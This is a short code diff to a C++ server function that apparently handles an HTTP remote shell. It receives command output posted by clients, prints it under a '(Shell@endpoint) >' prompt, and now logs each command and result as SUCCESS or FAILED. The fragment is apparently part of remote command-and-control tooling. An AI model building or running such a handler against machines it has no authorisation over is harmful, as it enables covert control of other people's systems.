@@ -340,19 +340,18 @@ void serve_client(string endpoint, int server_fd) {
         }
 
         // Process HTTP POST result.
-        if (full_request.find("POST") != string::npos && full_request.find("ERROR:") == string::npos) {
+        if (full_request.find("POST") != string::npos) {
+            int check=full_request.find("ERROR");
             string result = url_decode(body_data);
-
-            if (result.size() > 3) {
-                result.resize(result.size() - 3);
-                cout << result << "(Shell@" << endpoint << ") > " << flush;
-            } else {
-                cout << result << "(Shell@" << endpoint << ") > " << flush;
+            if(check<=0){
+                write_log(endpoint,local_user_input,result,"SUCCESS");
             }
-
+            else{
+                write_log(endpoint,local_user_input,"","FAILED");
+            }
+            cout << result <<"\n"<< "(Shell@" << endpoint << ") > " << flush;
             need_prompt = true;
         }
-
         // Send command to client.
         string body;
         {
